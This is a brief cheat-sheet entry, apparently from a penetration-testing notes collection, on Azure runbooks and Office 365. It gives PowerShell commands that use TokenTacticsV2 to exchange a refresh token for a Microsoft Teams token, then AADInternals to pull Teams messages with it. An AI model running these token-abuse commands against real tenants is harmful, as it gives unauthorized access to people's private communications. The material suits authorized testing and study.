# Azure Services

## Azure Runbook

Runbook must be SAVED and PUBLISHED before running it.



## Office 365

### Extracting Microsoft Teams Messages

```ps1
TokenTacticsV2> RefreshTo-MSTeamsToken -domain domain.local
AADInternals> Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | Format-Table id,content,deletiontime,*type*,DisplayName
```
